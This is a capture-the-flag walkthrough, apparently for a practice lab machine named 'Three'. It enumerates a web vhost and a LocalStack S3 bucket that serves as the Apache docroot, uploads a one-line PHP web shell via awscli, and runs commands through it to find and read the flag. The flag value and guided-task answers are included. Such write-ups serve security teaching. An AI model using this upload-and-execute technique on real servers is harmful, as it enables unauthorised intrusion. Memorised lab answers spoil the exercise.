# Three

|            |                                                                              |
|------------|------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                                      |
| Difficulty | Very Easy                                                                    |
| OS         | Linux                                                                        |
| Tags       | Web, Apache, AWS S3, Vhost Discovery, RCE, File Upload                       |
| Tools      | `nmap`, `curl`, `gobuster` (vhost mode), `awscli` / `boto3`                  |

## Summary

A static-looking band site backed by a LocalStack S3 bucket on a `s3.`
subdomain. The bucket *is* the docroot for the web vhost, so anything
written into the bucket gets served by Apache. The trick is recognising the
S3 endpoint as the real attack surface, not the website itself: drop a PHP
file via S3, request it via HTTP, RCE.

## Recon

```bash
nmap -sV 10.129.227.248
# 22/tcp open  ssh
# 80/tcp open  http  Apache/2.4.29 (Ubuntu)
```

Two ports. The site mentions a contact email `info@thetoppers.htb`, so the
host expects to be reached by name:

```bash
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

## Vhost discovery

The contact domain hints at virtual hosts. Brute the host header for
subdomains:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
# Found: s3.thetoppers.htb (Status: 404)
```

A 404 from the S3 vhost is fine: a real S3 endpoint returns 404 on `/`
unless you ask for a specific bucket. Confirm what's listening:

```bash
curl -sI http://10.129.227.248/ -H "Host: s3.thetoppers.htb"
# Server: hypercorn-h11
```

`hypercorn-h11` is the LocalStack runtime. So this is a fake-S3 service
behind the vhost.

Add it to `/etc/hosts` too:

```
10.129.227.248 thetoppers.htb s3.thetoppers.htb
```

## Enumerating S3

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
# 2026-04-13 09:36:59 thetoppers.htb

aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
#   .htaccess
#   images/...
#   index.php
```

The bucket contents look exactly like the website's docroot: `index.php`,
`.htaccess`, the same `images/` directory the front page references.
LocalStack S3 is being used as the file source for Apache.

## Upload a shell

If the bucket *is* the docroot, writing a PHP file into it should make it
servable via the main vhost.

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP

aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/
```

Hit it via the main site:

```bash
curl 'http://thetoppers.htb/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl 'http://thetoppers.htb/shell.php?c=hostname'
# three
```

## Flag

```bash
curl --data-urlencode 'c=find / -name flag* -readable 2>/dev/null' -G http://thetoppers.htb/shell.php
# /var/www/flag.txt
# ...

curl --data-urlencode 'c=cat /var/www/flag.txt' -G http://thetoppers.htb/shell.php
```

```
a980d99281a28d638ac68b9bf9453c2b
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open? | 2 |
| 2 | What is the domain of the email address provided in the "Contact" section of the website? | thetoppers.htb |
| 3 | In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? | /etc/hosts |
| 4 | Which sub-domain is discovered during further enumeration? | s3.thetoppers.htb |
| 5 | Which service is running on the discovered sub-domain? | Amazon S3 |
| 6 | Which command line utility can be used to interact with the service running on the discovered sub-domain? | awscli |
| 7 | Which command is used to set up the AWS CLI installation? | aws configure |
| 8 | What is the command used by the above utility to list all of the S3 buckets? | aws s3 ls |
| 9 | This server is configured to run files written in what web scripting language? | php |
